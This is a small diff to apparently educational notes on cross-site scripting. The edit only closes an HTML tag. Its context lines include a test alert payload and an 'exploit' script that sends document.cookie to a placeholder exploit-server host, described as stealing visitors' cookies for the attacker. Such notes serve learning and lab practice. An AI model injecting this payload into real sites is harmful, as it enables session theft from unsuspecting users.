@@ -1,4 +1,4 @@
-Payloads eg: <U>test123 , <script>alert(xss)</script>
+Payloads eg: <U>test123</U> , <script>alert(xss)</script>
 exploit eg: <script>document.location='//YOUR-EXPLOIT-SERVER-ID.exploit-server.net/'+document.cookie</script>
 (this extract the cookie of any user who visit xss vulnerable sites(post, blog etc) and send it to attackers server)
 
